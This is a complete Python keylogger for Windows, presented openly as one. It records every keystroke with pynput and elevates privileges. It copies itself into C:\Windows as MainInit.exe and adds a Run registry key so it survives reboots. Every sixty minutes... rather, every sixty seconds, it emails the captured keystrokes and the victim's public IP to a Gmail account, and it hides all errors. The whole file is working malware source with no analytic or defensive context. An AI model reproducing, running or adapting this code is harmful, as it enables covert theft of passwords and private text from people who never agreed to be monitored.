from pynput.keyboard import Listener 
import smtplib 
from threading import Thread  
import shutil  
import os 
import ntpath  
from elevate import elevate  
from sys import argv 
import time
import requests

class Keylogger:
    def __init__(self, username, password):
        self.username = username
        self.password = password
        self.send_time = 60
        self.mail_server = 'smtp.gmail.com: 587'
        self.log_append = ['\nFrom ' + requests.get('http://ip.42.pl/raw').text + ' >>> Keylogger started <<<'] 
        
    def become_persistent(self):
        try:
            shutil.copy(str(argv[0]), 'C:\\Windows')
            os.rename('C:\\Windows\\' + ntpath.basename(str(argv[0])), 'C:\\Windows\\MainInit.exe')
            os.system(r'reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /v Systemregedit /t REG_SZ /d ' + 'C:\\Windows\\MainInit.exe /f')
        except:
            pass

    def main_listener(self):
        def son_modding(son):
            son = str(son)
            son = son.replace("'", '')
            if son == 'Key.space':
                son = ' '
            elif son == 'Key.enter':
                son = '\n' 
            elif son == 'Key.backspace':
                son = '(del)' 
            elif 'Key' in son:
                son = ''
            self.log_append.append(son)
        with Listener(on_press = son_modding) as listener:
            listener.join()

    def sendding_mail(self, log_append):
        log_append = ''.join(log_append)
        if len(log_append) > 1:
            try:
                server = smtplib.SMTP(self.mail_server)
                server.starttls()
                server.login(self.username, self.password)
                server.sendmail(self.username, self.username, log_append)
                server.quit()
            except:
                pass

    def main_script(self):
        Thread(target = self.main_listener).start()
        while True:
            self.sendding_mail(self.log_append)
            self.log_append = ['\nFrom ' + requests.get('http://ip.42.pl/raw').text + ' >>> ']
            time.sleep(self.send_time)
        
    def start(self):
        if 'Windows' not in str(argv[0]):
            elevate()
        self.become_persistent()
        self.main_script()

key_scanner = Keylogger('mail@gmail.com', 'password')
key_scanner.start()
